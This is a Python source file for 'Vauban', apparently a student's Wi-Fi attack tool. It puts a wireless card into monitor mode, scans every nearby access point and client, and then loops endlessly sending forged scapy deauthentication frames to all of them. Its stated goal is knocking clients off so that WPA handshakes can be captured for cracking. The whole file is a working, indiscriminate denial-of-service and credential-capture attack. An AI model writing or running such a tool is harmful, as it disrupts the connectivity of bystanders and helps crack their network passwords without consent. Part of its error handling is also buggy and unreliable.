######Author : Victor Soler Renaud#####
######Mail : victorsoler.vsr@gmail.com

#Name of the project : Vauban

#Description
#This tool is for mass deauthentication : It can deauthenticate anyone from any wifi network.The purpose of this tool is to run it
#in parallel with an airodump-ng running to capture handshake
#Advice : Run airodump-ng in another separate wifi card (Otherwise, it could cause conflict/buse wifi card)

#Requirements :
#Linux
#All following python librairies : asyncio,pyrcrack(ONLY THE LOCAL VERSION PROVIDED HERE, IT'S A MODIFIED VERSION. THE OFFICIAL VERSION WONT WORK),rich,scapy,pandas
#A wireless card capable of monitor mode and injection of packets
#Python 3.5+ (tested in python 3.9.2 with Kali Linux)


#Possible improvements :
#-> Targeting only one client/network


#Some bugs could occur. The project is still in developpement.Don't hesitate to report those bugs and suggestions



#Asyncio is used for running async functions
import asyncio
#Pyrcrack is used for:
#1)Putting the wireless card in monitor mode
#2)Gather all networks and clients in the area
import pyrcrack_Modified as pyrcrack #This is the local version. You need it to run the program
#Used for prompt
from rich.console import Console
from rich.prompt import Prompt

#Used to forge packets to deauthenticate. I could use pyrcrack directly but
#for my school project, i needed to use scapy
from scapy.all import *
#Checking if a variable is not null
import pandas as pd

#Function to place the wireless card in monitor mode and scan the network
#Hugely inspired by pyrcrack documentation
async def scan_for_targets():
    console = Console()
    console.clear()
    console.show_cursor(False)
    console.rule()
    console.rule("VAUBAN -> DEAUTH EVERYTHING, EVERYONE, EVERYWHERE",style='bold')
    console.rule()
    #Declaring a airmonng object to get any wireless interfaces and to place the wireless card in monitor mode
    airmon = pyrcrack.AirmonNg()
    #prompt any intererface that could be used in this program
    try:
        interface = Prompt.ask(
            'Select an interface',
            choices=[a.interface for a in await airmon.interfaces])
    except UnicodeDecodeError:
        console.print("Error of encoding. Exiting... Please retry")
        sys.exit()
    cmd = 'airmon-ng check kill && airmon-ng start '+interface
    os.system(cmd)

    #performing an airodump scan with the interface
    async with airmon(interface) as mon:
        tic = time.perf_counter()
        async with pyrcrack.AirodumpNg() as pdump:

            async for result in pdump(mon.monitor_interface):
                #checking for time
                tac = time.perf_counter()
                console.clear()
                console.print('Capturing...',style='bold red')
                console.print('Time left : ' + str(int(10 -(tac - tic))))

                #Because we dont gather all networks/clients in 1 seconds, we need to wait
                #to gather any network/clients within our range
                if (tac - tic > 10):
                    #Pyrcrack is returning a list from the class result (in models.py from pyrcrack library)
                    #It's returning in the following format:
                    #result.(AccessPoint).(Clients)
                    #AccessPoint and Clients are two classes from models.py

                    #Here, we return the interface and the result from pyrcrack
                    return result,interface
                #Sleep 0.5 seconds to avoid any possible error
                await asyncio.sleep(0.5)

try:
    #Running the function with asyncio -> from asyncio docs
    loop = asyncio.get_event_loop()
    #We need to take the result (for networks and clients)
    #We also need the interface (for scapy)
    result,interface = loop.run_until_complete(scan_for_targets())
    console = Console()
    console.clear()
    #result.table is a special function from models.py which return a nicely presented table of clients/networks with all informations
    console.print(result.table)
    console.print('Bravo Six, going dark...',style='bold red')
    time.sleep(6)
#Handling some errors :
#KeyboardInterrupt -> Quitting the program if user is pressing CTRL+C
except KeyboardInterrupt:
    print('\nQuitting...')
    sys.exit()



while True:

    try:
        #we will talk about this variable later in the code
        network=0
        #For each access point
        for i in range(len(result)):

            #for each clients per access point
            for e in range(len(result[i].clients)):
                # We need to check whether it's a string (it can be dotMap(), and it's unexploitable at the moment)
                #Check also if the mac address of the client and the network is not null
                if isinstance(result[i].clients[e].bssid, str) == True and pd.notnull(result[i].clients[e].bssid) == True and pd.notnull(result[i].bssid) == True:
                    #dot11 is creating a 802.11 dot11 packet
                    dot11 = Dot11(addr1=result[i].clients[e].bssid, addr2=result[i].bssid, addr3=result[i].bssid)
                    #Encapsulating in a radioTap heading and putting the deauth attack from scapy (reason=7 specify that the reason for deauth is unknown)
                    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
                    console.print('Sending deauth to ' + result[i].clients[e].bssid + '|' + result[i].essid + '\n',style='bold red')
                    #Sending it, with an interval of 0.1 seconds and 5 packets (enough to get the handshake after). Verbose=0 specify that we dont need any terminal output from that command
                    sendp(packet, inter=0.1, count=5, iface=interface, verbose=0)
                    console.print('Target down. Next one.\n',style='bold green')
                    time.sleep(0.5)
#Handling some errors as well
    except KeyboardInterrupt:
        print('\nQuitting...')
        sys.exit()
#Asyncio can cause this error, but the program runs just fine
    except RuntimeError:
        pass
    #This error (Network is down) can occur when :
    #1) The wireless card is busy, so we need to wait a little bit
    #2) The wireless card is malfunctionning/not well configured/doesnt exist
    except OSError:
        #We add a pause and +1 in the network counter
        print('NETWORK PROBABLY BUSY, adding a pause...')
        time.sleep(5)
        print('Here we go again...')
        network=+1
        #If network counter reaches 5, then probably, the interface doesnt work
        if(network>5):
            print('Your interface is probably down/incorrect/malfunctionning. Exiting...')
            sys.exit()



